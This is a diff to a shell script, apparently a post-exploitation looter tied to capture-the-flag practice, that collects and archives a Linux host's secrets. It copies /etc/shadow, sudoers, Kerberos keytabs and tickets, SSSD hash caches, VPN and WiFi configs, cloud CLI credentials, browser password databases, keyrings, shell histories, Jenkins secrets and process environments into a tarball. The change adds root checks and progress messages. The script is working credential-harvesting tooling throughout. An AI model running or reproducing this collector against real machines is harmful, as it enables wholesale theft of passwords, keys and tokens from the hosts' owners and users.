@@ -20,6 +20,39 @@ META="$STAGE/meta"
 OUT="${TMPDIR:-/tmp}/nixdump-${HOST}-${STAMP}.tar.gz"
 MAXSZ=52428800          # skip single files larger than 50MB (keep bundle small)
 
+# ---------- access pre-checks ----------
+# EUID 0 = root, otherwise we silently skip root-only collectors.
+if [ "$(id -u 2>/dev/null)" = "0" ]; then
+    IS_ROOT=1
+else
+    IS_ROOT=0
+fi
+
+# can_read <path>: true if the file exists and is readable by us
+can_read() {
+    [ -f "$1" ] && [ -r "$1" ]
+}
+
+# can_list <dir>: true if dir exists, is a dir, and we can list it
+can_list() {
+    [ -d "$1" ] && [ -r "$1" ] && [ -x "$1" ]
+}
+
+# can_proc: we can read /proc/1/environ (root can, normal users cannot)
+if can_read /proc/1/environ; then
+    CAN_PROC=1
+else
+    CAN_PROC=0
+fi
+
+# ---------- progress ----------
+STEP_TOTAL=18
+STEP_N=0
+progress() {
+    STEP_N=$((STEP_N + 1))
+    printf '[*] [%2d/%2d] %s\n' "$STEP_N" "$STEP_TOTAL" "$1"
+}
+
 mkdir -p "$ROOT" "$META" 2>/dev/null || { echo "[!] cannot create staging dir"; exit 1; }
 
 log() { echo "[*] $1"; }
@@ -37,10 +70,13 @@ cp_one() {
     cp "$src" "$dst" 2>/dev/null
 }
 
-# copy every file (recursively) under a dir
+# copy every file (recursively) under a dir, skipping unreadable subtrees
 cp_dir() {
     [ -d "$1" ] || return 0
-    find "$1" -type f 2>/dev/null | while IFS= read -r f; do cp_one "$f"; done
+    find "$1" -type f 2>/dev/null | while IFS= read -r f; do
+        [ -r "$f" ] || continue
+        cp_one "$f"
+    done
 }
 
 # copy files found by name pattern under given roots (find -iname)
@@ -49,7 +85,10 @@ cp_find() {
     for r in "$@"; do
         [ -d "$r" ] || continue
         find "$r" -xdev -type f -iname "$pat" 2>/dev/null | \
-            while IFS= read -r f; do cp_one "$f"; done
+            while IFS= read -r f; do
+                [ -r "$f" ] || continue
+                cp_one "$f"
+            done
     done
 }
 
@@ -61,31 +100,33 @@ HOMES=$(
 )
 
 log "staging in $STAGE"
+log "euid=$(id -u 2>/dev/null)  proc_readable=$CAN_PROC"
 
 # ================= SYSTEM =================
+progress "system (/etc/shadow, passwd, sssd)"
 for f in /etc/shadow /etc/passwd /etc/gshadow /etc/sudoers \
          /etc/mysql/debian.cnf /etc/my.cnf /etc/krb5.conf /etc/krb5.keytab; do
     cp_one "$f"
 done
 cp_dir /etc/sudoers.d
-# SSSD cached domain hashes (binary ldb -> parsed offline)
 cp_dir /var/lib/sss/db
 cp_dir /var/lib/sss/secrets
 
 # ================= NETWORK =================
+progress "network (NM, wireguard, openvpn, cifs)"
 cp_dir /etc/NetworkManager/system-connections
 cp_dir /etc/wireguard
 cp_find "*.conf"  /etc/openvpn
 cp_find "*.ovpn"  /etc/openvpn /root /home
 cp_find "auth*.txt" /etc/openvpn
-# fstab + any cifs credential files it references
 cp_one /etc/fstab
 if [ -r /etc/fstab ]; then
     grep -o 'credentials=[^ ,]*' /etc/fstab 2>/dev/null | cut -d= -f2 | \
         while IFS= read -r cf; do cp_one "$cf"; done
 fi
 
-# ================= CRON / SYSTEMD / SHELL-RC (config_env.py) =============
+# ================= CRON / SYSTEMD / SHELL-RC =================
+progress "cron / systemd / shell-rc"
 cp_one /etc/crontab
 cp_one /etc/environment
 cp_one /etc/profile
@@ -98,10 +139,10 @@ cp_dir /etc/cron.weekly
 cp_dir /etc/cron.monthly
 cp_dir /var/spool/cron
 cp_dir /etc/profile.d
-# systemd unit files (Environment= / EnvironmentFile= hold inline creds)
 cp_find "*.service" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system /run/systemd/system
 
-# ================= SERVICE CONFIGS (services.py) =========================
+# ================= SERVICE CONFIGS =================
+progress "service configs (samba/ipsec/ppp/postfix/redis/wifi)"
 cp_one /etc/samba/smbpasswd
 cp_one /etc/samba/secrets.tdb
 cp_one /etc/ipsec.secrets
@@ -114,17 +155,14 @@ cp_one /etc/postfix/sasl/sasl_passwd
 cp_one /etc/redis/redis.conf
 cp_one /etc/redis.conf
 cp_find "*.conf" /etc/wpa_supplicant
-# cloud-init user-data (may contain passwd/hashed_passwd)
 cp_find "user-data*" /var/lib/cloud/instance /var/lib/cloud/instances
-# docker per-container env
 cp_find "config.v2.json" /var/lib/docker/containers
-# kubernetes admin/service configs
 cp_find "*.conf" /etc/kubernetes
-# db / backup dumps (pointers; grep offline)
 cp_find "*.sql" /var/www /srv /opt /var/backups /root /home
 cp_find "*.bak" /var/www /srv /opt /var/backups /root /home
 
-# ================= MAIL / GIT / TF / MONGO / LDAP / FTP (extra.py) =======
+# ================= MAIL / GIT / TF / MONGO / LDAP / FTP =================
+progress "mail / git / terraform / mongo / ldap / ftp"
 cp_one /etc/msmtprc
 cp_one /etc/nslcd.conf
 cp_one /etc/ldap.conf
@@ -139,13 +177,15 @@ cp_find "*.tfstate"   /opt /srv /home /root /var/lib
 cp_find "*.tfstate.backup" /opt /srv /home /root /var/lib
 cp_find "*.tfvars"    /opt /srv /home /root /var/lib
 
-# ================= CI / CONFIG-MGMT (apps.py) ===========================
+# ================= CI / CONFIG-MGMT =================
+progress "jenkins / ansible / tomcat"
 cp_dir /var/lib/jenkins/secrets
 cp_find "credentials.xml" /var/lib/jenkins /var/jenkins_home
 cp_find "*.yml" /etc/ansible
 cp_find "tomcat-users.xml" /etc/tomcat* /usr/share/tomcat* /var/lib/tomcat*
 
-# ================= WEB / DB / APP CONFIGS (walk) =================
+# ================= WEB / DB / APP CONFIGS =================
+progress "web / db / app configs"
 WEBROOTS="/var/www /srv /opt /usr/share/nginx /usr/local/www /var/lib /etc"
 for pat in "wp-config.php" "config.php" "config.inc.php" "configuration.php" \
            "settings.php" "local_settings.py" "settings.py" "database.php" \
@@ -158,23 +198,20 @@ for pat in "wp-config.php" "config.php" "config.inc.php" "configuration.php" \
 done
 
 # ================= PER-HOME USER STORES =================
+progress "per-home user stores (ssh/keyring/gpg/firefox/chromium)"
 for h in $HOMES; do
     [ -d "$h" ] || continue
-    # ssh
     cp_dir "$h/.ssh"
-    # shell / client histories
     for hist in .bash_history .zsh_history .sh_history .ash_history \
                 .python_history .mysql_history .psql_history \
                 .rediscli_history .node_repl_history .lesshst; do
         cp_one "$h/$hist"
     done
     cp_one "$h/.local/share/fish/fish_history"
-    # shell rc / env + user crontab + mysql/vnc
     for rc in .bashrc .bash_profile .zshrc .profile .bash_login .kshrc .cshrc \
               .mylogin.cnf .vnc/passwd .vnc/passwdfile; do
         cp_one "$h/$rc"
     done
-    # mail / git / mongo / ftp client stores
     for e in .msmtprc .config/msmtp/config .muttrc .mutt/muttrc \
              .config/mutt/muttrc .neomuttrc .config/neomutt/neomuttrc \
              .fetchmailrc .config/fetchmail/fetchmailrc \
@@ -183,7 +220,6 @@ for h in $HOMES; do
              .local/share/lftp/bookmarks .lftp/bookmarks .ncftp/bookmarks; do
         cp_one "$h/$e"
     done
-    # cloud / cli / dev creds
     for c in .aws/credentials .aws/config .azure/accessTokens.json \
              .azure/azureProfile.json .config/gcloud/credentials.db \
              .config/gcloud/application_default_credentials.json \
@@ -194,13 +230,11 @@ for h in $HOMES; do
         cp_one "$h/$c"
     done
     cp_dir "$h/.config/gcloud/legacy_credentials"
-    # secret stores (binary -> offline)
     cp_dir "$h/.gnupg"
     cp_dir "$h/.local/share/keyrings"
     cp_dir "$h/.kde/share/apps/kwallet"
     cp_dir "$h/.local/share/kwalletd"
     cp_dir "$h/.password-store"
-    # firefox / thunderbird profiles
     for b in .mozilla/firefox .thunderbird; do
         [ -d "$h/$b" ] || continue
         for f in logins.json key4.db key3.db signons.sqlite; do
@@ -208,7 +242,6 @@ for h in $HOMES; do
                 while IFS= read -r ff; do cp_one "$ff"; done
         done
     done
-    # chromium-family profiles
     for b in .config/google-chrome .config/chromium \
              ".config/BraveSoftware/Brave-Browser" .config/microsoft-edge \
              .config/vivaldi .config/opera \
@@ -224,49 +257,60 @@ for h in $HOMES; do
 done
 
 # ================= KERBEROS TICKETS / KEYTABS =================
+progress "kerberos ccache / keytabs"
 cp_find "krb5cc_*" /tmp /var/tmp /run
 cp_find "*.keytab" /etc /opt /home /root /var
 
-# ================= GENERIC SWEEPS (notes / scripts / configs / logs) =====
-# notes + extensionless (HTB: find /home/* -name '*.txt' -o ! -name '*.*')
+# ================= GENERIC SWEEPS =================
+progress "generic sweeps (notes/scripts/configs)"
 cp_find "*.txt" $HOMES
 for h in $HOMES; do
     [ -d "$h" ] || continue
     find "$h" -maxdepth 3 -type f ! -name "*.*" 2>/dev/null | \
         while IFS= read -r f; do cp_one "$f"; done
 done
-
-# scripts (HTB: .py .pyc .pl .go .jar .c .sh)
 for pat in "*.py" "*.pyc" "*.pl" "*.go" "*.jar" "*.c" "*.sh"; do
     cp_find "$pat" $HOMES /var/www /srv /opt
 done
-
-# generic config sweeps (HTB: .conf .config .cnf)
 for pat in "*.conf" "*.config" "*.cnf"; do
     cp_find "$pat" /etc /opt /srv /var/www
 done
 
-# logs (HTB: /var/log/*)
-cp_dir /var/log
+# ================= LOGS =================
+progress "logs (/var/log)"
+if can_list /var/log; then
+    cp_dir /var/log
+else
+    log "skip /var/log (not listable)"
+fi
 
-# ================= META: PROCESS ENV + CMDLINE (not files) =================
-{
-    for p in /proc/[0-9]*; do
-        pid=${p#/proc/}
-        comm=$(cat "$p/comm" 2>/dev/null)
-        env=$(tr '\0' '\n' < "$p/environ" 2>/dev/null)
-        cmd=$(tr '\0' ' '  < "$p/cmdline" 2>/dev/null)
-        [ -n "$env$cmd" ] || continue
-        echo "=== PID $pid ($comm) ==="
-        [ -n "$cmd" ] && echo "CMDLINE: $cmd"
-        if [ -n "$env" ]; then
-            echo "ENVIRON:"
-            echo "$env"
-        fi
-    done
-} > "$META/proc.txt" 2>/dev/null
+# ================= META: PROCESS ENV + CMDLINE =================
+progress "meta: /proc environ + cmdline"
+if [ "$CAN_PROC" = "1" ]; then
+    {
+        for p in /proc/[0-9]*; do
+            pid=${p#/proc/}
+            [ -r "$p/environ" ] || continue
+            [ -r "$p/cmdline" ] || continue
+            comm=$(cat "$p/comm" 2>/dev/null)
+            env=$(tr '\0' '\n' < "$p/environ" 2>/dev/null)
+            cmd=$(tr '\0' ' '  < "$p/cmdline" 2>/dev/null)
+            [ -n "$env$cmd" ] || continue
+            echo "=== PID $pid ($comm) ==="
+            [ -n "$cmd" ] && echo "CMDLINE: $cmd"
+            if [ -n "$env" ]; then
+                echo "ENVIRON:"
+                echo "$env"
+            fi
+        done
+    } > "$META/proc.txt" 2>/dev/null
+else
+    log "skip /proc environ (not readable as non-root)"
+    : > "$META/proc.txt"
+fi
 
 # ================= META: SSH-AGENT + LOGGED-IN USERS =================
+progress "meta: ssh-agent + logged-in users"
 {
     echo "## SSH_AUTH_SOCK (current session)"
     echo "${SSH_AUTH_SOCK:-<unset>}"
@@ -287,15 +331,18 @@ cp_dir /var/log
 } > "$META/ssh_agent.txt" 2>/dev/null
 
 # ================= META: MANIFEST =================
+progress "meta: manifest"
 {
     echo "host: $HOST"
     echo "date: $(date 2>/dev/null)"
     echo "id: $(id 2>/dev/null)"
     echo "uname: $(uname -a 2>/dev/null)"
     echo "euid_root: $([ "$(id -u 2>/dev/null)" = 0 ] && echo yes || echo no)"
+    echo "proc_readable: $CAN_PROC"
 } > "$META/manifest.txt" 2>/dev/null
 
 # ================= PACK =================
+progress "packing archive"
 if command -v tar >/dev/null 2>&1; then
     if tar czf "$OUT" -C "$STAGE" . 2>/dev/null; then
         :
